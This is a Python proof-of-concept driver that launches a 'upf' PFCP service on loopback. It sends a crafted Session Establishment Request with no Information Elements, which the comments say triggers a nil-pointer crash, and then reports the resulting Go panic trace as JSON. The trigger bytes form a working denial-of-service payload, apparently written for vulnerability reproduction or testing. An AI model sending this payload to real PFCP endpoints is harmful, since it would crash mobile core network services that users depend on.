#!/usr/bin/env python3
"""PoC driver for the `upf` PFCP network service.

Starts the service with a generated config, probes its PFCP endpoint
(127.0.0.1:8805, UDP), and reports a structured JSON result describing
exactly what was observed (crash trace or protocol transcript).

Stdlib only. Loopback only. Always terminates the target it started.
"""

import argparse
import json
import os
import re
import signal
import socket
import subprocess
import sys
import tempfile
import time

PFCP_PORT = 8805
PFCP_ADDR = ("127.0.0.1", PFCP_PORT)

# PFCP Heartbeat Request, version 1: used only to detect that the UDP
# listener is up. Message = flags(0x20) type(1) len(4) seq(3B) spare(1B).
HEARTBEAT_REQUEST = bytes([0x20, 0x01, 0x00, 0x04, 0x00, 0x00, 0x01, 0x00])

# Trigger: PFCP Session Establishment Request (message type 50) with the
# SEID-present (S) flag set, SEID = 0, sequence = 1, and no Information
# Elements. The service's session-establishment handler dereferences the
# mandatory Node ID IE without checking whether it was decoded, so this
# minimal, spec-shaped message drives the handler down a nil-pointer path.
SESSION_ESTABLISHMENT_REQUEST = (
    bytes([0x21, 0x32, 0x00, 0x0C])      # S flag, type 50, length 12
    + b"\x00" * 8                        # SEID
    + b"\x00\x00\x01\x00"                # sequence number + spare
)

# Minimal JSONC startup configuration (embedded; written under a temp dir).
CONFIG_JSONC = """\
{
  // mode/ifaces: af_packet on loopback, no external interfaces needed
  "mode": "af_packet",
  "access": { "ifname": "lo" },
  "core": { "ifname": "lo" },
  "cpiface": { "hostname": "", "http_port": "0", "dnn": "internet" },
  "n4_addr": "127.0.0.1",
  "resp_timeout": "2s",
  "read_timeout": 15,
  "log_level": "info"
}
"""

# A header line of a Go runtime fatal report (panic / fatal error / sigsegv).
PANIC_LINE_RE = re.compile(
    r"^(?:panic:|fatal error:|\[signal SIG(?:SEGV|BUS|ILL|FPE|ABRT)|"
    r"runtime: (?:invalid memory|pointer)|unexpected signal|"
    r"SIGSEGV: segmentation|SIGBUS: bus)",
    re.IGNORECASE,
)


def detect_signal_name(returncode):
    """Map a subprocess returncode to a signal name, or None."""
    if returncode is None or returncode >= 0:
        return None
    signum = -returncode
    try:
        return signal.Signals(signum).name
    except ValueError:
        return "SIG%d" % signum


def extract_crash_trace(stdout_text, stderr_text):
    """Extract the Go panic/fatal trace from captured output, if present."""
    combined = (stderr_text or "") + "\n" + (stdout_text or "")
    lines = combined.splitlines()
    matches = [i for i, line in enumerate(lines)
               if PANIC_LINE_RE.search(line.strip())]
    if not matches:
        return None
    # Start at the earliest matching header so a leading "panic: ..." line
    # stays attached to the [signal ...] line; stop at the end of that
    # goroutine dump so unrelated log output stays out of the trace.
    start = matches[0]
    end = len(lines)
    for i in range(start + 1, len(lines)):
        line = lines[i]
        if line.startswith("goroutine ") and "[running]" in line:
            for j in range(i + 1, len(lines)):
                if lines[j].strip() == "":
                    end = j
                    break
            break
    return "\n".join(lines[start:end]).strip()


def udp_roundtrip(payload, timeout):
    """Send one datagram to the PFCP endpoint; return reply bytes or None."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(timeout)
    try:
        sock.sendto(payload, PFCP_ADDR)
        try:
            data, _ = sock.recvfrom(65535)
            return data
        except socket.timeout:
            return None
    except OSError:
        return None
    finally:
        sock.close()


def wait_ready(proc, timeout_s):
    """Wait until the PFCP listener answers a heartbeat (or process exits).

    Returns True if a heartbeat response was received, False otherwise.
    """
    deadline = time.monotonic() + timeout_s
    while time.monotonic() < deadline:
        if proc.poll() is not None:
            return False
        reply = udp_roundtrip(HEARTBEAT_REQUEST, 0.3)
        if reply:
            return True
        time.sleep(0.1)
    return False


def wait_exit(proc, timeout_s):
    """Wait up to timeout_s for the process to exit; True if it exited."""
    deadline = time.monotonic() + timeout_s
    while time.monotonic() < deadline:
        if proc.poll() is not None:
            return True
        time.sleep(0.05)
    return proc.poll() is not None


def terminate_process(proc, grace_s=3.0):
    """Terminate the target process; escalate to kill if needed."""
    if proc.poll() is not None:
        return
    try:
        proc.terminate()
    except OSError:
        pass
    if not wait_exit(proc, grace_s):
        try:
            proc.kill()
        except OSError:
            pass
        try:
            proc.wait(timeout=5)
        except Exception:
            pass


def read_stream(stream):
    """Read remaining bytes from a (non-closed) pipe stream safely."""
    if stream is None:
        return ""
    chunks = []
    try:
        while True:
            data = stream.read(65536)
            if not data:
                break
            chunks.append(data)
    except Exception:
        pass
    try:
        stream.close()
    except Exception:
        pass
    return b"".join(chunks).decode("utf-8", errors="replace")


def run(binary, timeout_s):
    """Execute the full probe run and return the result dict."""
    started = time.monotonic()
    result = {
        "binary": binary,
        "command": None,
        "returncode": None,
        "signal": None,
        "timed_out": False,
        "runtime_ms": 0,
        "stdout": "",
        "stderr": "",
        "observable": {"kind": "protocol_transcript", "value": "no_response",
                       "path": None},
        "error": None,
    }

    if not os.path.isfile(binary):
        result["error"] = "binary not found: %s" % binary
        result["runtime_ms"] = int((time.monotonic() - started) * 1000)
        return result
    if not os.access(binary, os.X_OK):
        result["error"] = "binary is not executable: %s" % binary
        result["runtime_ms"] = int((time.monotonic() - started) * 1000)
        return result

    # Budget split: readiness wait, crash observation window, reserve for
    # shutdown. Keep everything inside the caller's --timeout.
    readiness_budget = min(20.0, max(3.0, timeout_s * 0.4))
    crash_window = max(2.0, timeout_s - readiness_budget - 3.0)

    proc = None
    tmpdir = tempfile.mkdtemp(prefix="upf-poc-")
    config_path = os.path.join(tmpdir, "upf.jsonc")
    try:
        with open(config_path, "w") as fh:
            fh.write(CONFIG_JSONC)

        command = [os.path.abspath(binary), "-config", config_path]
        result["command"] = command

        proc = subprocess.Popen(
            command,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            cwd=tmpdir,
            stdin=subprocess.DEVNULL,
        )

        # 1) Wait for the service to start accepting PFCP datagrams.
        if not wait_ready(proc, readiness_budget):
            rc = proc.poll()
            if rc is not None:
                result["returncode"] = rc
                result["signal"] = detect_signal_name(rc)
                result["error"] = (
                    "service exited before becoming ready (rc=%s)" % rc
                )
            else:
                result["error"] = "listener never became ready on %s:%d" % PFCP_ADDR
            return result

        # 2) Send the trigger input: Session Establishment Request with no
        #    Information Elements.
        reply = udp_roundtrip(SESSION_ESTABLISHMENT_REQUEST, 1.0)

        # 3) Observation window: did the service die from the input?
        crashed = wait_exit(proc, crash_window)

        if crashed:
            rc = proc.poll()
            result["returncode"] = rc
            result["signal"] = detect_signal_name(rc)
            result["timed_out"] = False
            if reply:
                result["observable"] = {
                    "kind": "protocol_transcript",
                    "value": reply.hex(),
                    "path": None,
                }
        else:
            # No abnormal termination: complete, valid run. We must
            # terminate the long-lived service ourselves.
            result["timed_out"] = True
            terminate_process(proc)
            result["returncode"] = proc.poll()
            result["signal"] = None
            result["observable"] = {
                "kind": "protocol_transcript",
                "value": reply.hex() if reply else "no_response",
                "path": None,
            }
    except Exception as exc:  # genuine failure of the run itself
        result["error"] = "run failed: %s: %s" % (type(exc).__name__, exc)
    finally:
        if proc is not None and proc.poll() is None:
            terminate_process(proc)
        if proc is not None:
            result["stdout"] = read_stream(proc.stdout)
            result["stderr"] = read_stream(proc.stderr)
        try:
            os.unlink(config_path)
        except OSError:
            pass
        try:
            os.rmdir(tmpdir)
        except OSError:
            pass

    # Upgrade to crash_trace if a panic/fatal trace is visible in the output.
    if result["signal"] or (result["returncode"] not in (None, 0)):
        trace = extract_crash_trace(result["stdout"], result["stderr"])
        if trace:
            result["observable"] = {
                "kind": "crash_trace",
                "value": trace,
                "path": None,
            }

    result["runtime_ms"] = int((time.monotonic() - started) * 1000)
    return result


def main(argv=None):
    parser = argparse.ArgumentParser(
        description="PoC driver: probe the upf PFCP service and report JSON."
    )
    parser.add_argument("--binary", required=True, help="path to target binary")
    parser.add_argument("--json-out", default=None,
                        help="write JSON result to this file instead of stdout")
    parser.add_argument("--timeout", type=float, default=30.0,
                        help="overall observation timeout in seconds")
    args = parser.parse_args(argv)

    result = run(args.binary, args.timeout)

    payload = json.dumps(result, indent=2, sort_keys=False)
    if args.json_out:
        out_dir = os.path.dirname(os.path.abspath(args.json_out))
        if out_dir and not os.path.isdir(out_dir):
            os.makedirs(out_dir, exist_ok=True)
        with open(args.json_out, "w") as fh:
            fh.write(payload + "\n")
    else:
        print(payload)
    return 0


if __name__ == "__main__":
    sys.exit(main())
